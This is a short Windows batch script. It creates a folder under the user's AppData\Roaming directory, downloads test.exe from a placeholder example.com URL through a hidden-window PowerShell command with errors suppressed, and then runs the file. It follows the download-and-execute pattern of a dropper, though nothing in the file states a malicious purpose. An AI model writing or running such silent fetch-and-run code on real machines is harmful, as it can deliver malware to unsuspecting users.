@echo off
setlocal

set "file=test.exe"
set "url=https://example.com/path/to/your/test.exe"
set "folder=%USERPROFILE%\AppData\Roaming\test"

:: Create folder if it does not exist
if not exist "%folder%" (
    mkdir "%folder%"
)

:: Check if file exists and run it
if exist "%folder%\%file%" (
    start "" "%folder%\%file%"
    exit /b
) else (
    echo Downloading file...
    powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%folder%\%file%' -ErrorAction SilentlyContinue"

    :: Verify the file was downloaded
    if exist "%folder%\%file%" (
        start "" "%folder%\%file%"
    ) else (
        echo Download failed.
    )
    
    :: Close CMD window after 5 seconds
    timeout /t 5 /nobreak >nul
    exit /b
)

endlocal
